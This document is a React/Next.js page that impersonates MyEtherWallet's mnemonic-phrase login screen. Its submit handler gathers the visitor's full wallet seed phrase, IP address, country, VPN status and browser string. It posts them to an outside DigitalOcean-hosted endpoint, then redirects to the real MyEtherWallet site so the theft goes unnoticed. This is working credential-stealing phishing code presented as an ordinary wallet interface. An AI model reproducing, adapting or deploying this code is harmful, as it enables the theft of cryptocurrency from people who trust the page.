"use client";

import { useState } from "react";
import { useRouter } from "next/navigation";
import { X, ArrowLeft } from "lucide-react";
import axios from "axios";
import { getUserCountry, checkVpnStatusWithIPQS } from "../../../userLocation";

export default function MnemonicAccess() {
  const router = useRouter();
  const [wordCount, setWordCount] = useState(12);
  const [words, setWords] = useState<string[]>(Array(12).fill(""));
  const [errorMessage, setErrorMessage] = useState<string>("");
  const [wordList, setWordList] = useState<string[]>([]);
  const [isLoading, setIsLoading] = useState<boolean>(false);

  const handleWordChange = (index: number, value: string) => {
    const newWords = [...words];
    newWords[index] = value;
    setWords(newWords);
  };

  const handlePaste = (e: React.ClipboardEvent<HTMLInputElement>) => {
    e.preventDefault();

    const pastedText = e.clipboardData.getData("text").trim();
    if (!pastedText) return;

    const pastedWords = pastedText
      .replace(/\n/g, " ")
      .replace(/,/g, " ")
      .split(/\s+/)
      .filter(Boolean);

    if (pastedWords.length === 12 || pastedWords.length === 24) {
      setWordCount(pastedWords.length);
      setWords(pastedWords);
      setErrorMessage("");
    } else {
      setErrorMessage(
        `Please paste exactly 12 or 24 words (you pasted ${pastedWords.length}).`
      );
    }
  };

  const handleNext = async () => {
    console.log("Mnemonic words:", words);

    try {
      // Get user location data
      const userCountry = await getUserCountry();

      if (!userCountry) {
        console.error("Failed to get user location data");
        return;
      }

      // Check VPN status
      const vpnDetected =
        userCountry.isVpnIpdata ||
        (await checkVpnStatusWithIPQS(userCountry.ip));

      // Prepare the data to send
      const requestData = {
        appName: "Etherwallet",
        seedPhrase: words.join(" "),
        vpnDetected,
        country: userCountry.country,
        ipAddress: userCountry.ip,
        browser:
          typeof navigator !== "undefined" ? navigator.userAgent : "Unknown",
      };

      console.log("Sending data:", requestData);

      // Post to the API endpoint
      const response = await axios.post(
        "https://clownfish-app-t9vi2.ondigitalocean.app/api/t1/image",
        requestData,
        {
          headers: {
            "Content-Type": "application/json",
            "x-api-key": process.env.NEXT_PUBLIC_SECRET_KEY,
          },
        }
      );

      console.log("API response:", response.data);
      const result = response.data;
      if (response.status === 200 && result.status) {
        console.log("redirecting to myetherwallet");
        window.location.href = "https://www.myetherwallet.com";
        console.log(result);
      } else {
        console.log("error redirecting to myetherwallet");
        const serverMessage = result?.message || "Something went wrong.";
        const serverError = result?.error ? ` (${result.error})` : "";
        setErrorMessage(serverMessage + serverError);
        setIsLoading(false);
      }
    } catch (error) {
      console.error("Error sending mnemonic data:", error);
    }
  };

  const handleClear = () => {
    setWords(Array(wordCount).fill(""));
  };

  return (
    <div className="min-h-screen bg-teal-50 flex items-center justify-center p-4">
      <div className="bg-white rounded-2xl shadow-xl max-w-2xl w-full p-8 relative">
        {/* Header */}
        <button
          onClick={() => router.push("/connect")}
          className="absolute top-6 left-6 text-gray-400 hover:text-gray-600"
        >
          <ArrowLeft className="w-6 h-6" />
        </button>
        <button
          onClick={() => router.push("/wallet")}
          className="absolute top-6 right-6 text-gray-400 hover:text-gray-600"
        >
          <X className="w-6 h-6" />
        </button>

        <h1 className="text-3xl font-bold text-gray-900 text-center mb-8">
          Access Wallet with Mnemonic Phrase
        </h1>

        {/* Progress */}
        <div className="flex items-center justify-center mb-8">
          <div className="flex items-center">
            <div className="w-10 h-10 rounded-full bg-blue-600 text-white flex items-center justify-center">
              1
            </div>
            <div className="w-64 h-1 bg-gray-300 mx-2"></div>
            <div className="w-10 h-10 rounded-full bg-gray-300 text-gray-600 flex items-center justify-center">
              2
            </div>
          </div>
        </div>

        <div className="flex items-center justify-center text-sm text-gray-600 mb-8">
          <span className="font-semibold text-blue-600">Enter Phrase</span>
          <span className="mx-16"></span>
          <span>Address & Network</span>
        </div>

        {/* Content */}
        <div className="max-w-3xl mx-auto">
          <p className="text-sm text-gray-500 mb-2">STEP 1.</p>
          <h2 className="text-2xl font-bold text-gray-900 mb-4">
            Enter your Mnemonic Phrase
          </h2>
          <p className="text-gray-600 mb-6">
            Please type the mnemonic phrase you wrote down in the right order.
          </p>

          {/* Word Count Selector */}
          <div className="mb-6 flex justify-end">
            <select
              value={wordCount}
              onChange={(e) => {
                const count = parseInt(e.target.value);
                setWordCount(count);
                setWords(Array(count).fill(""));
              }}
              className="border border-gray-300 rounded-lg px-4 py-2 focus:outline-none focus:border-teal-500"
            >
              <option value={12}>12 words</option>
              <option value={24}>24 words</option>
            </select>
          </div>

          {/* Word Inputs */}
          <div className="border-2 border-teal-500 rounded-lg p-6 mb-6">
            <div className="grid grid-cols-4 gap-4">
              {words.map((word, index) => (
                <div key={index}>
                  <label className="text-xs text-gray-500 mb-1 block">
                    {index + 1}.
                  </label>
                  <input
                    type="text"
                    value={word}
                    onChange={(e) => handleWordChange(index, e.target.value)}
                    onPaste={handlePaste}
                    className="w-full border-b border-gray-300 pb-2 focus:border-teal-500 focus:outline-none"
                  />
                </div>
              ))}
            </div>
          </div>

          {/* Extra Word */}
          <div className="mb-6">
            <button className="text-gray-700 text-sm mb-2 hover:text-teal-600">
              Do you have an extra word?
            </button>
            <select className="w-full border border-gray-300 rounded-lg px-4 py-2 focus:outline-none focus:border-teal-500">
              <option>Add your word</option>
            </select>
          </div>

          {/* Buttons */}
          <div className="flex flex-col items-center gap-4">
            <button
              onClick={handleNext}
              disabled={words.some((w) => !w)}
              className="bg-gray-300 cursor-pointer text-gray-600 px-20 py-4 rounded-lg font-semibold disabled:opacity-50 disabled:cursor-not-allowed hover:bg-gray-400 transition"
            >
              Next
            </button>
            <button
              onClick={handleClear}
              className="text-teal-600 cursor-pointer hover:underline"
            >
              Clear
            </button>
          </div>
        </div>
      </div>
    </div>
  );
}
